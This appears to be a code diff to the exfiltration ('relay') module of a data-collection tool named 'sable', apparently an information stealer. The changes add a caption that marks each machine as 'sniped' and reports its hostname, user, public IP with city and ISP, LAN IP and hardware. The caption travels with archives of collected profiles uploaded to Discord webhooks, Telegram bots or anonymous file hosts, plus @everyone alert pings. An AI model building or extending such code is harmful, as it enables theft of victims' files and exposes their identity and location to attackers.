@@ -32,6 +32,13 @@ _MESSAGE_LIMIT: Final[int] = 1900
 _MAX_RESPONSE: Final[int] = 8 * 1024
 _MAX_UPLOAD: Final[int] = 2 * 1024 * 1024 * 1024
 
+# Discord drops every mention a webhook writes unless the payload opts in. Sending
+# "@here" without this object is a message that reads like a ping and rings nothing,
+# which is worse than no ping at all because it looks like it worked.
+_ALLOWED_MENTIONS: Final[dict[str, list[str]]] = {
+    "parse": ["everyone", "users", "roles"]
+}
+
 # Link relays. A webhook carries a message and a file, and its file ceiling belongs to
 # the platform: 10 MB on a plain Discord server. A collected profile is hundreds of
 # megabytes, so "send the file" and "send a link to the file" are different features,
@@ -52,6 +59,10 @@ _LITTERBOX_MAX: Final[int] = 950 * 1024 * 1024
 _MIN_THROUGHPUT: Final[int] = 128 * 1024
 _MIN_UPLOAD_TIMEOUT: Final[float] = 60.0
 _MAX_UPLOAD_TIMEOUT: Final[float] = 1800.0
+
+# A status line is worth five seconds and not one more: it sits before the upload, so
+# a dead network must not delay the thing it is reporting on.
+_PING_TIMEOUT: Final[float] = 5.0
 
 _CONTENT_TYPES: Final[dict[str, str]] = {
     ".zip": "application/zip",
@@ -76,23 +87,29 @@ class RelayError(RuntimeError):
     """Delivery failed. Raised, never returned, so it cannot be ignored."""
 
 
-def transmit(cfg: Any, archive: Path) -> None:
-    """Send ``archive`` to the configured relay. Raises RelayError on failure."""
+def transmit(cfg: Any, archive: Path, summary: dict[str, Any] | None = None) -> None:
+    """Send ``archive`` to the configured relay. Raises RelayError on failure.
+
+    ``summary`` is the machine description the message carries in front of the file.
+    Without it the caption falls back to name and size, which is what every earlier
+    artifact sent and what nobody could read.
+    """
     if not archive.is_file():
         raise RelayError(f"{archive.name}: archive is missing")
 
     kind = cfg.relay.kind
     endpoint = cfg.relay.endpoint
+    caption = _caption(cfg, archive, summary)
     failure: Exception | None = None
 
     for attempt in range(1, _ATTEMPTS + 1):
         try:
             if kind == "telegram":
-                _send_telegram(endpoint, archive)
+                _send_telegram(endpoint, archive, caption)
             elif kind == "link":
-                _send_link(endpoint, archive)
+                _send_link(endpoint, archive, caption)
             else:
-                _send_https(endpoint, archive)
+                _send_https(endpoint, archive, caption)
             log.logger.debug("relay: delivered %s on attempt %d", archive.name, attempt)
             return
         except Exception as exc:
@@ -120,9 +137,110 @@ def _content_type(archive: Path) -> str:
     return _CONTENT_TYPES[suffix]
 
 
-def _caption(archive: Path) -> str:
-    text = f"sable {archive.name} {archive.stat().st_size} bytes"
-    return _fit(text, _CAPTION_LIMIT)
+def human_bytes(size: int) -> str:
+    """A size a person can read, rounded the way a file manager rounds it."""
+    if size >= 1024 ** 3:
+        return f"{size / 1024 ** 3:.2f} GB"
+    if size >= 1024 ** 2:
+        return f"{size / 1024 ** 2:.1f} MB"
+    if size >= 1024:
+        return f"{size / 1024:.1f} KB"
+    return f"{size} bytes"
+
+
+def describe(summary: dict[str, Any] | None) -> str:
+    """The machine block that goes out with the archive.
+
+    Written the way a person reads it: what it is, who was on it, where it is, then
+    the hardware. Bold marks the labels so the values are what the eye lands on. A
+    missing fact drops its line rather than printing "unknown", because a line that
+    says nothing is a line that costs the reader a second.
+    """
+    if not summary:
+        return ""
+
+    lines: list[str] = []
+
+    host = summary.get("hostname")
+    if host:
+        lines.append(f"**sniped** {host}")
+
+    who = summary.get("user")
+    where = summary.get("os")
+    identity = [
+        part
+        for part in (f"**user** {who}" if who else "", f"**os** {where}" if where else "")
+        if part
+    ]
+    if identity:
+        lines.append(" · ".join(identity))
+
+    public = summary.get("public_ip")
+    if public:
+        place = ", ".join(
+            part
+            for part in (
+                str(summary.get("city") or ""),
+                str(summary.get("region") or ""),
+                str(summary.get("country") or ""),
+            )
+            if part
+        )
+        isp = summary.get("isp")
+        tail = " · ".join(part for part in (place, str(isp or "")) if part)
+        lines.append(f"**ip** {public}" + (f" · {tail}" if tail else ""))
+
+    lan = summary.get("lan_ip")
+    if lan:
+        lines.append(f"**lan** {lan}")
+
+    cpu = summary.get("cpu")
+    if cpu:
+        lines.append(f"**cpu** {cpu}")
+
+    gpu = summary.get("gpu")
+    if gpu:
+        lines.append(f"**gpu** {gpu}")
+
+    hardware: list[str] = []
+    ram = summary.get("ram_gib")
+    if ram:
+        hardware.append(f"{round(float(ram))} GB ram")
+    arch = summary.get("arch")
+    if arch:
+        hardware.append(str(arch))
+    uptime = summary.get("uptime")
+    if uptime:
+        hardware.append(f"up {uptime}")
+    if hardware:
+        lines.append("**box** " + " · ".join(hardware))
+
+    gate = summary.get("gate")
+    if gate:
+        lines.append(f"**gate** {gate}")
+
+    return "\n".join(lines)
+
+
+def _with_mention(cfg: Any, text: str, *, alert: bool) -> str:
+    mention = str(getattr(cfg.relay, "mention", "") or "").strip()
+    body = _fit(str(text), _MESSAGE_LIMIT)
+    if not alert or not mention:
+        return body
+    return _fit(f"{mention} {body}", _MESSAGE_LIMIT)
+
+
+def _caption(cfg: Any, archive: Path, summary: dict[str, Any] | None) -> str:
+    """The message that travels with the file.
+
+    Falls back to the old name-and-size line when no summary was gathered, so a
+    caller that does not pass one still sends something true rather than nothing.
+    """
+    block = describe(summary)
+    size = archive.stat().st_size
+    tail = f"**archive** {archive.name} · {human_bytes(size)}"
+    text = f"{block}\n{tail}" if block else f"sable {archive.name} {size} bytes"
+    return _with_mention(cfg, text, alert=True)
 
 
 def _fit(text: str, limit: int) -> str:
@@ -179,7 +297,9 @@ def _post(url: str, body: bytes, boundary: str, timeout: float = _TIMEOUT) -> by
     return answer
 
 
-def _post_json(url: str, document: dict[str, str]) -> bytes:
+def _post_json(
+    url: str, document: dict[str, Any], timeout: float = _TIMEOUT
+) -> bytes:
     payload = json.dumps(document).encode("utf-8")
     request = urllib.request.Request(url, data=payload, method="POST")
     request.add_header("Content-Type", "application/json")
@@ -187,7 +307,7 @@ def _post_json(url: str, document: dict[str, str]) -> bytes:
     request.add_header("User-Agent", _USER_AGENT)
 
     try:
-        with urllib.request.urlopen(request, timeout=_TIMEOUT, context=_SSL) as response:
+        with urllib.request.urlopen(request, timeout=timeout, context=_SSL) as response:
             status = int(response.status)
             answer = response.read(_MAX_RESPONSE)
     except urllib.error.HTTPError as exc:
@@ -200,9 +320,40 @@ def _post_json(url: str, document: dict[str, str]) -> bytes:
     return answer
 
 
-def _send_https(endpoint: str, archive: Path) -> None:
+def notify(cfg: Any, text: str, *, alert: bool = False) -> bool:
+    """Post one short status line to the status webhook. Never raises.
+
+    A status message is a courtesy, not a delivery. If the webhook is wrong, slow or
+    gone, the run continues and the archive still goes out: swallowing here is what
+    stops a broken notification from costing you the collection.
+
+    ``alert`` puts the configured mention in front of the text. Only terminal messages
+    ask for it — a phone that buzzes on every stage is a phone that gets muted, and a
+    muted channel is the same as no channel.
+
+    The timeout is deliberately shorter than a delivery timeout. Notifications sit on
+    the critical path of a run that a machine may kill at any moment.
+    """
+    endpoint = getattr(cfg.relay, "ping", "") or ""
+    if not endpoint:
+        return False
+    body: dict[str, Any] = {"content": _with_mention(cfg, text, alert=alert)}
+    body["allowed_mentions"] = _ALLOWED_MENTIONS
+    try:
+        _post_json(endpoint, body, timeout=_PING_TIMEOUT)
+    except Exception:
+        log.logger.debug("status webhook did not accept the message", exc_info=True)
+        return False
+    return True
+
+
+def _send_https(endpoint: str, archive: Path, caption: str) -> None:
     payload = _read(archive)
-    fields = {"payload_json": json.dumps({"content": _caption(archive)})}
+    fields = {
+        "payload_json": json.dumps(
+            {"content": caption, "allowed_mentions": _ALLOWED_MENTIONS}
+        )
+    }
     body, boundary = _multipart(
         fields, "files[0]", archive.name, payload, _content_type(archive)
     )
@@ -216,10 +367,10 @@ def _split_telegram(endpoint: str) -> tuple[str, str]:
     return parts[0], parts[1]
 
 
-def _send_telegram(endpoint: str, archive: Path) -> None:
+def _send_telegram(endpoint: str, archive: Path, caption: str) -> None:
     token, chat = _split_telegram(endpoint)
     payload = _read(archive)
-    fields = {"chat_id": chat, "caption": _caption(archive)}
+    fields = {"chat_id": chat, "caption": _fit(caption, _CAPTION_LIMIT)}
     body, boundary = _multipart(
         fields, "document", archive.name, payload, _content_type(archive)
     )
@@ -251,11 +402,11 @@ def _link_host(size: int) -> tuple[str, dict[str, str]]:
     )
 
 
-def _link_message(archive: Path, url: str) -> str:
-    return _fit(f"sable {archive.name} {archive.stat().st_size} bytes\n{url}", _MESSAGE_LIMIT)
+def _link_message(caption: str, url: str) -> str:
+    return _fit(f"{caption}\n{url}", _MESSAGE_LIMIT)
 
 
-def _send_link(endpoint: str, archive: Path) -> None:
+def _send_link(endpoint: str, archive: Path, caption: str) -> None:
     """Upload to an anonymous host, then post the URL to the webhook.
 
     Two hops, two failure modes, and both have to be checked: the host answers with
@@ -276,7 +427,10 @@ def _send_link(endpoint: str, archive: Path) -> None:
         raise RelayError(f"link host returned no url: {url[:120]!r}")
 
     log.logger.debug("relay: hosted %s at %s", archive.name, url)
-    _post_json(endpoint, {"content": _link_message(archive, url)})
+    _post_json(
+        endpoint,
+        {"content": _link_message(caption, url), "allowed_mentions": _ALLOWED_MENTIONS},
+    )
 
 
-__all__ = ["RelayError", "transmit"]
+__all__ = ["RelayError", "describe", "human_bytes", "notify", "transmit"]
